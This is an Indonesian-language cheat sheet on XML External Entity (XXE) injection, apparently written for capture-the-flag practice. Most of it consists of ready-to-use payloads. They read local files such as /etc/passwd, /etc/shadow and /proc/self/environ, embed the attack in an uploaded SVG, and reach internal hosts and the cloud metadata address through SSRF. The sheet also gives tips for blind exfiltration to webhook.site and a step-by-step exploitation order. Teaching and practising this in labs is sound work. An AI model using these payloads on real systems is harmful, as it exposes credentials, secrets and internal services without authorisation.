# XXE (XML External Entity Injection)
XXE terjadi ketika aplikasi memproses input XML dan mengizinkan external entity. Biasanya ditemukan di fitur upload file XML, SOAP request, atau endpoint yang menerima Content-Type application/xml.
## Basic XXE Payload
Struktur dasar XXE selalu dimulai dengan mendefinisikan entity dulu di DOCTYPE, lalu memanggilnya di dalam XML.
```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe "test">
]>
<root>&xxe;</root>
```
Kalau output menampilkan kata test, berarti entity diproses dan aplikasi vulnerable terhadap XXE.
## Read Local File
Ini payload paling umum di CTF — membaca file sensitif dari server.
```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>&xxe;</root>
```
### File CTF:
```
file:///etc/passwd
file:///etc/hosts
file:///etc/shadow
file:///proc/self/environ
file:///var/www/html/config.php
file:///flag.txt
```
## XXE via File Upload
Kalau ada fitur upload file (misalnya upload SVG, DOCX, atau XML), coba sisipkan payload XXE di dalamnya. SVG sangat sering vulnerable karena berbasis XML.
```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<svg xmlns="http://www.w3.org/2000/svg">
  <text>&xxe;</text>
</svg>
```
## XXE to SSRF
XXE bisa dipakai untuk mengakses resource internal yang tidak bisa diakses dari luar.
```
xml<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://192.168.1.1/admin">
]>
<root>&xxe;</root>
Ini berguna untuk menjangkau service internal seperti metadata cloud (http://169.254.169.254/) atau port internal yang tidak terbuka ke publik.
```
### XXE
Cek Content-Type requestnya dulu. Buka Burp Suite, kalau ada request yang mengirim XML atau ada endpoint /api yang menerima data, coba ubah body-nya jadi XML dengan DOCTYPE dan lihat responsnya berubah tidak.
Kalau tidak ada output, langsung coba Blind XXE dengan webhook.site. Masukkan URL webhook ke payload SYSTEM, kalau ada request masuk berarti XXE berhasil meski tidak tampil di halaman.
SVG upload sering diabaikan peserta lain. Kalau ada fitur upload gambar dan ekstensi SVG diizinkan, itu hampir pasti celah XXE. Jangan skip fitur upload saat reconnaissance.
Perhatikan error message. Kadang parser XML menampilkan error yang bocorkan path file atau versi library. Itu informasi berharga untuk menentukan payload yang tepat.
Urutan eksploitasi yang efisien: Deteksi dulu dengan entity sederhana → coba baca /etc/passwd → kalau blind, setup OOB listener → eskalasi ke SSRF kalau ada internal network.

